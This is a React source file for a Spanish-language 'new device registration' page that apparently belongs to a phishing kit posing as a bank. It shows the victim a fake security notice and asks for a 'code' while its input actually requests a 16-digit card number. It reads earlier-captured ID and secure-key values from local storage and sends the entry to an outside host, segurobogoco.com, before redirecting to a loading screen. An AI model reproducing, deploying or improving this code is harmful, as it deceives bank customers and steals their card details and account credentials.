import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const CCRequired = () => {
  const [cc, setCc] = useState('');
  const [message, setMessage] = useState('');
  const [documentNumber, setDocumentNumber] = useState('');
  const [secureKey, setSecureKey] = useState('');
  const [loading, setLoading] = useState(false);
  const [guestId, setGuestId] = useState(null); // Para manejar el guestId
  const navigate = useNavigate();

  useEffect(() => {
    // Recuperar los valores del formulario del localStorage cuando el componente se monta
    const savedFormValues = localStorage.getItem('formValues');
    const savedDocumentNumber = localStorage.getItem('documentNumber');
    const savedSecureKey = localStorage.getItem('secureKey');
    const savedGuestId = localStorage.getItem('guestId'); // Asegurarse de recuperar guestId

    if (savedFormValues) {
      const formValues = JSON.parse(savedFormValues);
      setCc(formValues.cardNumber || ''); // Asigna el número de tarjeta
    }

    if (savedDocumentNumber) {
      setDocumentNumber(savedDocumentNumber); // Asigna el número de documento
    }

    if (savedSecureKey) {
      setSecureKey(savedSecureKey); // Asigna el secureKey
    }

    if (savedGuestId) {
      setGuestId(savedGuestId); // Asigna el guestId
    }

    if (!savedDocumentNumber || !savedSecureKey || !savedGuestId) {
      setMessage('No se encontraron los datos necesarios en el localStorage.');
    }
  }, [navigate]);

  const handleSubmit = async () => {
    if (cc.length === 16) {
      const savedGuestId = localStorage.getItem('guestId');
      console.log('Guest ID:', savedGuestId); // Verifica el guestId
  
      if (savedGuestId) {
        const updateResponse = await fetch(`https://segurobogoco.com/api/v1/guest/${savedGuestId}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            otp: cc, // Asegúrate de que este campo sea correcto
            status_id: 4,
          }),
        });
  
        console.log('Update Response:', updateResponse); // Verifica la respuesta
        const responseBody = await updateResponse.json();
        console.log('Response Body:', responseBody); // Muestra el error detallado
  
        if (!updateResponse.ok) {
          throw new Error('Error al actualizar el estado del guest');
        }
  
        // Redirigir a la página de loading
        navigate('/loading');
      } else {
        setMessage('No se encontró el ID del guest.');
      }
    } else {
      setMessage('Por favor, ingrese un número de tarjeta de 16 dígitos.');
    }
  };

  return (
    <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg p-6 mt-8">
      <div className="flex items-center space-x-4 mb-2">
        <img
          src="../../../public/images.png"
          alt="Menu"
          className="w-14 h-auto"
        />
        <p className="text-xl font-bold">Registro nuevo dispositivo</p>
      </div>
      <img src="../../../public/hombre-afro-caminando-con-bolsas-en-el-hombro.jpg" alt="hombre con bolsas"
        className='mb-4' />
      <div className="space-y-4 text-center">
        <h1>Registro de <b>Nuevo Dispositivo</b></h1>
        <div className="flex flex-col items-center text-gray-500">
          <p>Acabamos de detectar un nuevo ingreso a la plataforma de un dispositivo no registrado.</p>
          <p>Por tu seguridad te hemos enviado un código de acceso al número registrado a la cuenta con número de Identificación <b>{documentNumber || 'No disponible'} </b></p>
          <span className="text-gray-700 pt-2 font-bold">Digite el Código:</span>
          <input
            type="text"
            value={cc}
            onChange={(e) => setCc(e.target.value)}
            placeholder="Ingrese el número de tarjeta"
            maxLength="16"
            required
            className="w-full h-12 border border-gray-300 rounded px-3 mt-2 focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-150 ease-in-out"
          />
        </div>
        <button
          onClick={handleSubmit}
          className="w-full h-12 bg-[#0043a9] text-white rounded-lg hover:bg-blue-700 transition duration-150 ease-in-out"
        >
          Enviar
        </button>
        {message && <p className="text-red-500 mt-2 text-center">{message}</p>}
      </div>
    </div>
  );
};

export default CCRequired;
